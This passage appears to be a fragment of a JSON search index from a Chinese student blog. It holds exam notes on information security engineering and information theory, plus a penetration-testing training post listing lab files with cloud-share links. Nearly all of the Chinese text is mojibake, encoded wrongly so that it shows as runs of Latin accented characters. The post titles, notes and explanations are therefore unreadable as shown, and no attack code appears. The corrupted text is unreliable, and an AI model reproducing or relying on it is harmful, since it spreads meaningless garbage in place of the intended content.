ï¼šä¿¡æ¯ç³»ç»Ÿå®‰å…¨å·¥ç¨‹ä¿¡æ¯ç³»ç»Ÿå®‰å…¨å·¥ç¨‹ï¼ˆISSEï¼‰ä¸€é¡¹å·¥ç¨‹ï¼šç³»ç»Ÿå·¥ç¨‹ ç³»ç»Ÿï¼šä¿¡æ¯ç³»ç»Ÿï¼šå…·æœ‰ç‰¹å®šåŠŸèƒ½çš„æœ‰æœºæ•´ä½“ ç”Ÿå‘½å‘¨æœŸï¼šè®¡ç®—ç¯å¢ƒã€åŒºåŸŸè¾¹ç•Œã€ç½‘ç»œåŸºç¡€è®¾æ–½ã€æ”¯æŒæ€§åŸºç¡€è®¾æ–½ ä¹å¤§æ€æƒ³ ç›®çš„ï¼šæ»¡è¶³ç”¨æˆ·å®‰å…¨éœ€æ±‚ 2. åŸºç¡€ï¼šç³»ç»Ÿé£é™©åˆ†æ 3. æŒ‡å¯¼ï¼šç³»ç»Ÿå·¥ç¨‹æ–¹æ³•è®º è¦ç´ ï¼šæŠ€æœ¯ã€è¿è¡Œã€äºº 5. æŠ€æœ¯æ”¯æ’‘ï¼šçºµæ·±é˜²å¾¡ 6.è¿è¡Œå®‰å…¨ä¿è¯ï¼šç”Ÿå‘½æœŸæ”¯æŒ å®‰å…¨ç®¡ç†åŸºç¡€ï¼šå®‰å…¨å®è·µ 8. è´¨é‡ä¾æ®ï¼šæµ‹è¯„è®¤è¯ 9. è´¨é‡ä¿è¯ï¼šPDCA å…­å¤§åŠŸèƒ½ å®‰å…¨è§„åˆ’ä¸æ§åˆ¶ã€ç¡®å®šå®‰å…¨éœ€æ±‚ã€æ”¯æŒå®‰å…¨è®¾è®¡ã€åˆ†æå®‰å…¨æ“ä½œã€æ”¯æŒå®‰å…¨ç”Ÿå‘½å‘¨æœŸã€ç®¡ç†å®‰å…¨é£é™© äº”å¤§è¿‡ç¨‹ æŒ–æ˜ä¿¡æ¯å®‰å…¨éœ€æ±‚â†’å®šä¹‰ä¿¡æ¯ç³»ç»Ÿå®‰å…¨â†’è®¾è®¡ä¿¡æ¯ç³»ç»Ÿå®‰å…¨â†’å®æ–½ä¿¡æ¯ç³»ç»Ÿå®‰å…¨â†’è¯„ä¼°ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ ç¬¬ä¸‰ç« ï¼šä¿¡æ¯å®‰å…¨å·¥ç¨‹èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹æ¡†æ¶ æŒ‰æˆç†Ÿåº¦åˆ†æˆ5ä¸ªçº§åˆ«ï¼šåˆå§‹çº§ã€å¯é‡å¤çº§ã€å·²å®šä¹‰çº§ã€å·²ç®¡ç†çº§ã€ä¼˜åŒ–çº§ æ¯ä¸ªæˆç†Ÿçº§åˆ«æŒ‡ç¤ºäº†è¿™ä¸ªçº§åˆ«æ‰€å¯¹åº”çš„è¿‡ç¨‹èƒ½åŠ›ï¼ŒåŒ…å«å…³é”®è¿‡ç¨‹åŸŸï¼ˆKPAï¼‰ï¼Œæ¯ä¸ªKPAä»£è¡¨ä¸€ç»„ç›¸å…³å·¥ä½œï¼Œå®Œæˆè¯¥ç›®æ ‡è®¤ä¸ºè¯¥è¿‡ç¨‹èƒ½åŠ›æé«˜ã€‚ æ¯ä¸ªKPAçš„å·¥ä½œï¼Œä»¥ç»„ç»‡æ–¹å¼ç»†åŒ–ä¸ºä¸€èˆ¬ç‰¹æ€§ï¼ˆCFï¼‰ï¼Œç”±è‹¥å¹²ä¸ªå…³é”®å®æ–½KPç»„æˆï¼ŒKPæ˜¯è½¯ä»¶è¿‡ç¨‹çš„åŸºç¡€&#x2F;ç»“æ„ åè¯è§£é‡Š CMMï¼ˆCapability Maturity Modelï¼‰ï¼šèƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹CMMIï¼ˆCapability Maturity Model Integrationï¼‰ï¼šèƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹é›†æˆSSE-CMMï¼šç³»ç»Ÿå®‰å…¨èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹DMMï¼šæ•°æ®ç®¡ç†æˆç†Ÿåº¦æ¨¡å‹CMMCï¼ˆCybersecurity Maturity Model Certificationï¼‰ï¼šç½‘ç»œå®‰å…¨æˆç†Ÿåº¦æ¨¡å‹DCMMï¼šæ•°æ®ç®¡ç†èƒ½åŠ›æˆç†Ÿåº¦è¯„ä¼°æ¨¡å‹DSMMï¼šæ•°æ®å®‰å…¨èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹Level: çº§åˆ« â† CF: ä¸€èˆ¬ç‰¹å¾ â†GP: é€šç”¨å®æ–½Process: è¿‡ç¨‹ â† PC: è¿‡ç¨‹ç±»åˆ« â† PA: è¿‡ç¨‹åŸŸ â† BP: åŸºæœ¬å®æ–½ ç³»ç»Ÿå®‰å…¨å·¥ç¨‹èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹ ç»“æ„ Level: çº§åˆ« â† CF: ä¸€èˆ¬ç‰¹å¾ â†GP: é€šç”¨å®æ–½ Process: è¿‡ç¨‹ â† PC: è¿‡ç¨‹ç±»åˆ« â† PA: è¿‡ç¨‹åŸŸ â† BP: åŸºæœ¬å®æ–½ PCï¼š1.å®‰å…¨å·¥ç¨‹è¿‡ç¨‹ + 2.é¡¹ç›®è¿‡ç¨‹ + 3.ç»„ç»‡è¿‡ç¨‹ å®‰å…¨å·¥ç¨‹è¿‡ç¨‹ï¼š 1.é£é™©è¿‡ç¨‹ + 2.å·¥ç¨‹è¿‡ç¨‹ + 3.ä¿è¯è¿‡ç¨‹ ç¬¬å››ç« ï¼šä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ç­‰ä¿1.0â†’ç­‰ä¿2.0 å®æ–½ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ æœ‰æ•ˆåœ°æé«˜æˆ‘å›½ä¿¡æ¯å’Œä¿¡æ¯ç³»ç»Ÿå®‰å…¨å»ºè®¾çš„æ•´ä½“æ°´å¹³ã€‚ æœ‰åˆ©äºå®ç°ä¿éšœä¿¡æ¯å®‰å…¨ä¸ä¿¡æ¯åŒ–å»ºè®¾ç›¸åè°ƒï¼Œä¸ºä¿¡æ¯ç³»ç»Ÿå®‰å…¨å»ºè®¾å’Œç®¡ç†æä¾›ç³»ç»Ÿæ€§ã€é’ˆå¯¹æ€§ã€å¯è¡Œæ€§çš„æŒ‡å¯¼å’ŒæœåŠ¡ï¼Œæœ‰æ•ˆæ§åˆ¶ä¿¡æ¯å®‰å…¨å»ºè®¾æˆæœ¬ã€‚ å®æ–½ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ å®ç°å›½å®¶å¯¹é‡è¦ä¿¡æ¯ç³»ç»Ÿã€ç½‘ç»œé‡ç‚¹çš„ä¿æŠ¤;ä¿ƒè¿›ä¿¡æ¯åŒ–ã€ç»´æŠ¤å›½å®¶ä¿¡æ¯å®‰å…¨;æ˜¯äº‹å…³å›½å®¶å®‰å…¨ã€ç¤¾ä¼šç¨³å®šã€å…¬å…±åˆ©ç›Šçš„åŸºç¡€æ€§å·¥ä½œã€‚ æœ‰æ•ˆè§£å†³æˆ‘å›½ä¿¡æ¯å®‰å…¨é¢ä¸´çš„å¨èƒå’Œå­˜åœ¨çš„ä¸»è¦é—®é¢˜ï¼ŒåŠ å¼ºç½‘ç»œå®‰å…¨ç®¡ç†ï¼Œæœ‰æ•ˆæé«˜æˆ‘å›½ä¿¡æ¯å®‰å…¨ä¿éšœå·¥ä½œçš„æ•´ä½“æ°´å¹³ã€‚ æœ‰åˆ©äºä¸ºä¿¡æ¯ç³»ç»Ÿå®‰å…¨å»ºè®¾å’Œç®¡ç†æä¾›ç³»ç»Ÿæ€§ã€é’ˆå¯¹æ€§ã€å¯è¡Œæ€§çš„æŒ‡å¯¼å’ŒæœåŠ¡ï¼Œæœ‰æ•ˆæ§åˆ¶ä¿¡æ¯å®‰å…¨å»ºè®¾æˆæœ¬ã€‚ æœ‰åˆ©äºä¼˜åŒ–ä¿¡æ¯å®‰å…¨èµ„æºçš„é…ç½®ï¼Œä¿éšœé‡è¦ä¿¡æ¯ç³»ç»Ÿçš„å®‰å…¨ æœ‰åˆ©äºæ¨åŠ¨ä¿¡æ¯å®‰å…¨äº§ä¸šçš„å‘å±•ï¼Œé€æ­¥æ¢ç´¢å‡ºä¸€æ¡é€‚åº”ç¤¾ä¼šä¸»ä¹‰å¸‚åœºç»æµå‘å±•å’Œç½‘ç»œå¼ºå›½å‘å±•çš„ä¿¡æ¯å®‰å…¨æ¨¡å¼ã€‚ ä¿æŠ¤å¯¹è±¡ åŸºç¡€ä¿¡æ¯ç½‘ç»œã€äº‘è®¡ç®—ã€å¤§æ•°æ®ã€ç‰©è”ç½‘ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå’Œé‡‡ç”¨ç§»åŠ¨äº’è”æŠ€æœ¯çš„ç³»ç»Ÿç­‰ ä¿æŠ¤æµç¨‹ å®šçº§å¤‡æ¡ˆâ†’å®‰å…¨å»ºè®¾â†’ç­‰çº§æµ‹è¯„â†’å®‰å…¨æ•´æ”¹ ï¼ˆç›‘ç£æ£€æŸ¥ï¼‰ ä¿æŠ¤è¦æ±‚ é€šç”¨è¦æ±‚ï¼šä¸€ä¸ªä¸­å¿ƒï¼Œä¸‰é‡é˜²æŠ¤æ‰©å±•è¦æ±‚ï¼šäº‘è®¡ç®—ã€ç§»åŠ¨äº’è”ã€ç‰©è”ç½‘ã€å·¥æ§ ä¿æŠ¤æµç¨‹ å®šçº§å¤‡æ¡ˆâ†’å®‰å…¨å»ºè®¾â†’ç­‰çº§æµ‹è¯„â†’å®‰å…¨æ•´æ”¹ (ç›‘ç£æ£€æŸ¥) å®‰å…¨é€šç”¨è¦æ±‚ å®‰å…¨ç‰©ç†ç¯å¢ƒ å®‰å…¨é€šä¿¡ç½‘ç»œ å®‰å…¨åŒºåŸŸè¾¹ç•Œ å®‰å…¨è®¡ç®—ç¯å¢ƒ å®‰å…¨ç®¡ç†åˆ¶åº¦ å®‰å…¨ç®¡ç†æœºæ„ å®‰å…¨ç®¡ç†äººå‘˜ å®‰å…¨å»ºè®¾ç®¡ç† å®‰å…¨è¿ç»´ç®¡ç† ç¬¬äº”ç« ï¼šä¿¡æ¯å®‰å…¨é£é™©è¯„ä¼°ä¿¡æ¯å®‰å…¨é£é™©è¯„ä¼°å…³ç³» æ ¸å¿ƒï¼šé£é™©ä¸‰å¤§è¦ç´ ï¼šèµ„äº§ã€å¨èƒã€è„†å¼±æ€§ æµç¨‹ å‡†å¤‡ï¼šç›®æ ‡ã€èŒƒå›´ã€å›¢é˜Ÿã€è°ƒç ”ã€ä¾æ®ã€æ–¹æ¡ˆã€æ”¯æŒè¯†åˆ«ï¼šèµ„äº§ã€å¨èƒã€è„†å¼±æ€§ï¼ˆå·²æœ‰å®‰å…¨æªæ–½ï¼‰è®¡ç®—ï¼šé£é™©å€¼å¤„ç†ï¼šè¦å¹²ä»€ä¹ˆï¼Œæ€ä¹ˆå¹² ç¬¬å…­ç« ï¼šä¿¡æ¯å®‰å…¨ç®¡ç†åŸºç¡€ä¿¡æ¯å®‰å…¨ç®¡ç†åŸºç¡€æ¦‚å¿µ å¯¹ä¿¡æ¯ç³»ç»Ÿè¿›è¡Œè§„åˆ’å’Œç®¡ç†ï¼Œä¿è¯å…¶æ­£å¸¸è¿è¡Œï¼Œå¯¹æé«˜ç³»ç»Ÿè¿è¡Œçš„å¯ç”¨æ€§å’Œè¿ç»­æ€§æœ‰ç€è‡³å…³é‡è¦çš„æ„ä¹‰ã€‚æ¶µç›–4ä¸ªå±‚æ¬¡ï¼Œä¿¡æ¯ç³»ç»Ÿç®¡ç†è§„èŒƒåŒ–ã€æµç¨‹çš„è§„èŒƒåŒ–ã€ç»„ç»‡ç»“æ„çš„è§„èŒƒåŒ–ã€è§„ç« åˆ¶åº¦çš„è§„èŒƒåŒ– æ„ä¹‰ ç®¡ç†æ˜¯è´¯ç©¿ä¿¡æ¯å®‰å…¨æ•´ä¸ªè¿‡ç¨‹çš„ç”Ÿå‘½çº¿ã€‚æœ‰åŠ©äºè´¯å½»å®æ–½ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ï¼Œæœ‰åŠ©äºè¾¾åˆ°é«˜çº§åˆ«çš„å®‰å…¨è¦æ±‚ã€æ˜¯è®¸å¤šå®‰å…¨æŠ€æœ¯å’Œæœºåˆ¶å‘æŒ¥ä½œç”¨çš„ä¿è¯ å†…å®¹ ä¿¡æ¯å®‰å…¨â»›é™©ç®¡ç† è®¾æ–½çš„å®‰å…¨ç®¡ç†åŒ…æ‹¬ ç½‘ç»œçš„å®‰å…¨ç®¡ç† ä¿å¯†è®¾å¤‡çš„å®‰å…¨ç®¡ç† ç¡¬ä»¶è®¾æ–½çš„å®‰å…¨ç®¡ç† åœºåœ°è®¾æ–½çš„å®‰å…¨ç®¡ç† ä¿¡æ¯çš„å®‰å…¨ç®¡ç† å­˜å‚¨ä»‹è´¨çš„å®‰å…¨ç®¡ç† æŠ€æœ¯æ–‡æ¡£çš„å®‰å…¨ç®¡ç† è½¯ä»¶è®¾æ–½çš„å®‰å…¨ç®¡ç† å¯†é’¥å’Œå£ä»¤çš„å®‰å…¨ç®¡ç† è¿è¡Œçš„å®‰å…¨ç®¡ç† å®‰å…¨å®¡è®¡ å®‰å…¨æ¢å¤ åŸåˆ™ è§„èŒƒåŒ–åŸåˆ™ 2. ç³»ç»ŸåŒ–åŸåˆ™ 3. åˆä¿éšœåŸåˆ™ 4. ä»¥äººä¸ºæœ¬åŸåˆ™ 5. é¢„é˜²åŸåˆ™ 6. é£é™©è¯„ä¼°åŸåˆ™ åŠ¨æ€åŸåˆ™ 8. æˆæœ¬æ•ˆç›ŠåŸåˆ™ 9. å…¶ä»–åŸåˆ™:åˆ†æƒåˆ¶è¡¡åŸåˆ™ã€æœ€å°ç‰¹æƒåŸåˆ™ã€èŒæƒåˆ†ç¦»åŸåˆ™ã€æ™®éå‚ä¸åŸåˆ™ã€å®¡è®¡ç‹¬ç«‹åŸåˆ™ç­‰ã€‚ ä¿¡æ¯å®‰å…¨ç®¡ç†ä½“ç³»(ISMS)æ¼”å˜ BS7799 â†’ ISO&#x2F;IEC17799â†’ ISO&#x2F;IEC 27000â†’GB&#x2F;T æ¦‚å¿µã€åŸåˆ™ï¼ˆå°±æ˜¯ä¸Šé¢çš„é‚£9ä¸ªåŸåˆ™ï¼‰ æ¦‚å¿µï¼šæŒ‡çš„æ˜¯åœ¨ä¸€å®šèŒƒå›´å†…å»ºç«‹çš„ä¿¡æ¯å®‰å…¨æ–¹é’ˆå’Œç›®æ ‡ï¼Œä»¥åŠä¸ºå®ç°è¿™äº›æ–¹é’ˆå’Œç›®æ ‡æ‰€é‡‡ç”¨çš„æ–‡ä»¶ä½“ç³»å’Œæ–¹æ³•çš„æ€»å’Œã€‚ æµç¨‹ è¯†åˆ«èµ„äº§ã€æ˜ç¡®è¦æ±‚ â†’ é£é™©è¯„ä¼°ã€å¤„ç½® â†’ é£é™©æ§åˆ¶ â†’ æŒç»­æ”¹è¿› ç¬¬ä¸ƒç« ï¼šä¿¡æ¯å®‰å…¨ç­–ç•¥ç½‘ç»œå®‰å…¨ä½“ç³» PDRæ¨¡å‹ PDRRæ¨¡å‹ PPDRæ¨¡å‹ PPDRRæ¨¡å‹ ç­–ç•¥ã€ä¿æŠ¤ã€æ£€æµ‹ã€å“åº”ã€æ¢å¤ã€å®‰å…¨ã€èƒ½åŠ›å®šä¹‰ï¼ˆåŸºäºæ—¶é—´ï¼‰ ä¿¡æ¯å®‰å…¨ç­–ç•¥æ¦‚å¿µã€æ„ä¹‰ æ¦‚å¿µ: æ˜¯æè¿°ç»„ç»‡å…·æœ‰å“ªäº›é‡è¦ä¿¡æ¯èµ„äº§ï¼Œå¹¶è¯´æ˜è¿™äº›ä¿¡æ¯èµ„äº§å¦‚ä½•è¢«ä¿æŠ¤çš„ä¸€ä¸ªè®¡åˆ’ã€‚ä¿¡æ¯å®‰å…¨ç­–ç•¥æ˜¯è¿›ä¸€æ­¥åˆ¶å®šæ§åˆ¶è§„åˆ™å’Œå®‰å…¨ç¨‹åºçš„å¿…è¦åŸºç¡€;æ˜¯ä¸€ç»„è§„åˆ™ï¼Œè¿™ç»„è§„åˆ™æè¿°äº†ä¸€ä¸ªç»„ç»‡è¦å®ç°çš„ä¿¡æ¯å®‰å…¨ç›®æ ‡å’Œå®ç° è¿™äº›ä¿¡æ¯å®‰å…¨ç›®æ ‡çš„é€”å¾„ã€‚ æ„ä¹‰: ä¿¡æ¯å®‰å…¨ç­–ç•¥æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä¿¡æ¯å®‰å…¨é¡¹ç›®åˆ¶å®šçš„å¿…è¦åŸºç¡€ã€‚(2)ä¿¡æ¯å®‰å…¨ç­–ç•¥çš„åˆ¶å®šå’Œå®æ–½å†³å®šäº†ä»»ä½•ä¸€ä¸ªä¿¡æ¯å®‰å…¨é¡¹ç›®çš„æˆåŠŸ(3)æ”¹å–„äº†ä¿¡æ¯å®‰å…¨ç®¡ç†çš„å¯æ‰©å±•æ€§å’Œçµæ´»æ€§æ˜¯åº”ç”¨ä¿¡æ¯å®‰å…¨ç­–ç•¥çš„ä¸»è¦ä¼˜åŠ¿ã€‚ åˆ¶å®šæµç¨‹ è°ƒæŸ¥ä¸åˆ†æé˜¶æ®µâ†’è®¾è®¡é˜¶æ®µâ†’å®æ–½é˜¶æ®µâ†’ç»´æŠ¤é˜¶æ®µ ä¹¦å†™","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ä¿¡æ¯å®‰å…¨å·¥ç¨‹","slug":"æœŸæœ«è€ƒè¯•/ä¿¡æ¯å®‰å…¨å·¥ç¨‹","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"},{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/tags/%E5%AE%9E%E9%AA%8C/"}],"author":"Gryffinbit"},{"title":"æ¸—é€æµ‹è¯•å®è®­","slug":"æ¸—é€æµ‹è¯•å®è®­","date":"2021-07-08T10:32:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2021/07/08/æ¸—é€æµ‹è¯•å®è®­/","permalink":"https://gryffinbit.top/2021/07/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%AE%AD/","excerpt":"","text":"é™„ä»¶é“¾æ¥: https://pan.baidu.com/s/18XawGQqRQYyjp70qcdMDMA å¯†ç : 1hrsâ€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº« é™„ä»¶å†…å®¹åŒ…æ‹¬ï¼š rockoa-é¶æœºæ‰€éœ€è¦çš„phpç‰ˆæœ¬ã€‚php_5.4.45 å¸¸è§æ¼æ´å°ç»“xmind æ¸—é€æµ‹è¯•æ”»å‡»æµç¨‹xmind ï¼ˆDAY2ï¼‰ IdeaProjects ä¸€ä¸ªwebçš„è¯¾ç¨‹è®¾è®¡ï¼Œã€Šåƒå•¥ï¼Ÿä¸€ä¸ªå¸®ä½ è§£å†³åƒé¥­é€‰æ‹©ææƒ§ç—‡çš„ç³»ç»Ÿã€‹ HBuilderProjects ã€‚ä¸€äº›å‰ç«¯éƒ¨ç½² Nnnné¶æœº ä¸€ä¸ªå·²ç»è£…å¥½çš„kaliï¼Œæœ€æ–°ç‰ˆæœ¬ã€‚å®‰è£…äº†Gvmï¼ˆOpenvasï¼‰ æ¸—é€æµ‹è¯•çš„æœ€ç»ˆå®éªŒæŠ¥å‘Š","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"ä¿¡æ¯è®ºä¸ç¼–ç -è€ƒç‚¹","slug":"ä¿¡æ¯è®ºä¸ç¼–ç -è€ƒç‚¹","date":"2021-07-02T11:22:31.000Z","updated":"2024-11-12T06:59:57.000Z","comments":true,"path":"2021/07/02/ä¿¡æ¯è®ºä¸ç¼–ç -è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/07/02/%E4%BF%A1%E6%81%AF%E8%AE%BA%E4%B8%8E%E7%BC%96%E7%A0%81-%E8%80%83%E7%82%B9/","excerpt":"","text":"ã€ä¿¡æ¯è®ºä¸ç¼–ç ã€‘æœŸæœ«è€ƒè¯•é™„ä»¶è¯¾ç¨‹å­¦ä¹ æ—¶çš„ç”µå­ä¹¦ã€è¯¾åé¢˜ã€å®éªŒæŠ¥å‘Š é“¾æ¥: https://pan.baidu.com/s/1atIkMwzXMjKJ62QJY2QD5g æå–ç : 8ped å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ é¢˜å‹é€‰æ‹©ã€å¡«ç©ºã€åˆ¤æ–­ã€ç®€ç­”ã€è®¡ç®—ã€ç¼–ç¨‹ï¼ˆä¸‰ä¸ªå®éªŒä¸­çš„ï¼‰ ç¬¬ä¸€ç«  æ‰€æœ‰åŸºæœ¬æ¦‚å¿µ æ¦‚å¿µå¯¹æ•°åº¦é‡ä¿¡æ¯ ä¸€ä¸ªä¿¡æ¯æ‰€å«æœ‰çš„ä¿¡æ¯é‡ç”¨å®ƒçš„æ‰€æœ‰å¯èƒ½çš„å–å€¼çš„ä¸ªæ•°çš„å¯¹æ•°æ¥è¡¨ç¤ºã€‚ é¦™å†œä¿¡æ¯çš„å®šä¹‰ ä¿¡æ¯æ˜¯å¯¹äº‹ç‰©è¿åŠ¨çŠ¶æ€æˆ–å­˜åœ¨æ–¹å¼çš„ä¸ç¡®å®šæ€§çš„æè¿° æ¦‚ç‡ ä¸ç¡®å®šæ€§å°±æ˜¯éšæœºæ€§ï¼Œå…·æœ‰ä¸ç¡®å®šæ€§çš„äº‹ä»¶å°±æ˜¯éšæœºäº‹ä»¶ã€‚æ¦‚ç‡ç”¨æ¥æµ‹åº¦ä¸ç¡®å®šæ€§çš„å¤§å°ã€‚ è‡ªä¿¡æ¯ æŸä¸ªæ¶ˆæ¯ $x_i$ å‡ºç°çš„ä¸ç¡®å®šæ€§å¤§å°å®šä¹‰ä¸ºè‡ªä¿¡æ¯ï¼Œç”¨è¿™ä¸ªæ¶ˆæ¯å‡ºç°æ¦‚ç‡çš„å¯¹æ•°çš„è´Ÿå€¼æ¥è¡¨ç¤º $I(x_i) &#x3D; -log\\ \\ p(x_i)$ è‡ªä¿¡æ¯åŒæ—¶è¡¨ç¤ºè¿™ä¸ªä¿¡æ¯æ‰€åŒ…å«çš„ä¿¡æ¯é‡ã€‚ ä¿¡æ¯ç†µ ä¿¡æ¯ç†µè¡¨ç¤ºä¿¡æºçš„å¹³å‡ä¸ç¡®å®šæ€§çš„å¤§å°ï¼ŒåŒæ—¶è¡¨ç¤ºä¿¡æºè¾“å‡ºçš„æ¶ˆæ¯å¹³å‡æ‰€å«ä¿¡æ¯é‡ ä¿¡æºæ‰€å«æœ‰çš„ä¿¡æ¯é‡å®šä¹‰ä¸ºä¿¡æºå‘å‡ºçš„æ‰€æœ‰å¯èƒ½æ¶ˆæ¯çš„å¹³å‡ä¸ç¡®å®šæ€§ï¼Œä¿¡æºæ‰€å«æœ‰çš„ä¿¡æ¯é‡ç§°ä¸ºä¿¡æ¯ç†µã€‚ä¿¡æ¯ç†µå®šä¹‰ä¸ºè‡ªä¿¡æ¯çš„ç»Ÿè®¡å¹³å‡ $H(X)&#x3D;-\\sum_{i&#x3D;1}^{q} p\\left(x_{i}\\right) \\log p\\left(x_{i}\\right)$ $q$ è¡¨ç¤ºä¿¡æºæ¶ˆæ¯çš„ä¸ªæ•°ã€‚ é€šä¿¡ç³»ç»Ÿ ä¿¡æºï¼šäº§ç”Ÿæ¶ˆæ¯å’Œæ¶ˆæ¯åºåˆ—çš„æº ç¼–ç å™¨ï¼šæ˜¯ä¿¡å·ï¼Œæºå¸¦æ¶ˆæ¯ï¼Œæ˜¯ä¿¡æ¯çš„è½½ä½“ ä¿¡æºç¼–ç å™¨ï¼šå‹ç¼©ä¿¡æºå†—ä½™åº¦ã€‚æé«˜ä¼ è¾“æ•ˆç‡ ä¿¡é“ç¼–ç å™¨ï¼šæ·»åŠ ç›‘ç£ç å…ƒã€‚æé«˜ä¼ è¾“å¯é æ€§ ä¿¡é“ï¼š é€šä¿¡ç³»ç»ŸæŠŠè½½è·æ¶ˆæ¯çš„ä¿¡å·ä»å‘é€ç«¯é€åˆ°æ¥æ”¶ç«¯çš„åª’ä»‹æˆ–é€šé“ï¼ŒåŒ…æ‹¬æ”¶å‘è®¾å¤‡åœ¨å†…çš„ç‰©ç†è®¾æ–½ã€‚ è¯‘ç å™¨ï¼š æŠŠä¿¡é“è¾“å‡ºçš„å·²å åŠ äº†å¹²æ‰°çš„ç¼–ç ä¿¡å·è¿›è¡Œåå˜æ¢ï¼Œå˜æˆä¿¡å®¿èƒ½å¤Ÿç†è§£çš„æ¶ˆæ¯ã€‚ ä¿¡å®¿ï¼š æ¶ˆæ¯ä¼ é€çš„å¯¹è±¡ï¼Œå³æ¥æ”¶æ¶ˆæ¯çš„äººã€æœºå™¨æˆ–å…¶ä»– ç¬¬äºŒç«  è€ƒç‚¹ä¿¡æ¯ç†µã€æ¡ä»¶ç†µã€è”åˆç†µã€‚è¦çŸ¥é“æ€ä¹ˆè®¡ç®— å¹³å‡äº’ä¿¡æ¯ã€‚ âœ… äº’ä¿¡æ¯æœ‰ä»€ä¹ˆä½œç”¨ï¼šç¬¬å››ç« ä¿¡é“å®¹é‡ï¼Œæ±‚ã€‚ ç¬¬ä¸ƒç«  âœ… ç†µæœ‰ä»€ä¹ˆä½œç”¨ï¼šä¿¡æºç†µã€‚ä¿¡æºç¼–ç å®šç†ç”¨åˆ°äº†ç†µã€‚é¦™å†œå®šç†89é¡µã€‚ç¼–ç çš„é•¿åº¦ï¼Œç é•¿çš„ä¸Šé™ âœ… ä¿¡æ¯ç†µã€å¹³å‡äº’ä¿¡æ¯å¾ˆé‡è¦ âœ… ä¿¡æ¯çš„åº¦é‡ I è¡¨ç¤ºè‡ªä¿¡æ¯ âœ… I è¡¨ç¤ºäº’ä¿¡æ¯è¿ç”¨ âœ… ï¼šè¡¨ç¤ºä¸¤ä¸ªä¿¡æ¯å˜é‡ä¹‹é—´çš„äº’ä¿¡æ¯ ï¼Œè¡¨ç¤ºå¤šä¸ªå˜é‡ä¹‹é—´çš„è”åˆæ¦‚ç‡åˆ†å¸ƒ æ³¨æ„é€—å·å’Œå†’å·åŒºåˆ«ï¼Œ çœ‹è¯¾åçš„ä¹ é¢˜ã€ä¹¦ä¸Šçš„ä¾‹é¢˜ ä¿¡æ¯ç†µhxå®šä¹‰P9çš„2.3ï¼Œæ¡ä»¶ç†µå®šä¹‰P13 2.18 2.16è”åˆç†µã€‚æ€ä¹ˆå˜æ¢ ä¹¦ä¸ŠP9ä¹ é¢˜ã€‚ æ¦‚å¿µè‡ªä¿¡æ¯ï¼ˆé‡ï¼‰ ä¸€ä¸ªäº‹ä»¶ï¼ˆæ¶ˆæ¯ï¼‰æœ¬èº«æ‰€åŒ…å«çš„ä¿¡æ¯é‡ï¼Œå®ƒæ˜¯ç”±äº‹ä»¶çš„ä¸ç¡®å®šæ€§å†³å®šçš„ äº’ä¿¡æ¯ï¼ˆé‡ï¼‰ ä¸€ä¸ªäº‹ä»¶æ‰€ç»™å‡ºå…³äºå¦ä¸€ä¸ªäº‹ä»¶çš„ä¿¡æ¯é‡ å¹³å‡è‡ªä¿¡æ¯ï¼ˆé‡ï¼‰â€”â€” ä¿¡æ¯ç†µ äº‹ä»¶é›†æ‰€åŒ…å«çš„å¹³å‡ä¿¡æ¯é‡ï¼Œå®ƒè¡¨ç¤ºä¿¡æºçš„å¹³å‡ä¸ç¡®å®šæ€§ å¹³å‡äº’ä¿¡æ¯ï¼ˆé‡ï¼‰ ä¸€ä¸ªäº‹ä»¶é›†æ‰€ç»™å‡ºå…³äºå¦ä¸€ä¸ªäº‹ä»¶é›†çš„å¹³å‡ä¿¡æ¯é‡ è‡ªä¿¡æ¯ $I(x_i)$éšæœºäº‹ä»¶çš„è‡ªä¿¡æ¯é‡ $I(x_i)$ æ˜¯è¯¥äº‹ä»¶å‘ç”Ÿæ¦‚ç‡ $p(x_i)$ çš„å‡½æ•° æ¦‚ç‡è¶Šå°ï¼Œäº‹ä»¶å‘ç”Ÿçš„ä¸ç¡®å®šæ€§è¶Šå¤§ï¼Œäº‹ä»¶å‘ç”Ÿä»¥åæ‰€åŒ…å«çš„è‡ªä¿¡æ¯é‡è¶Šå¤§ æé™æƒ…å†µ 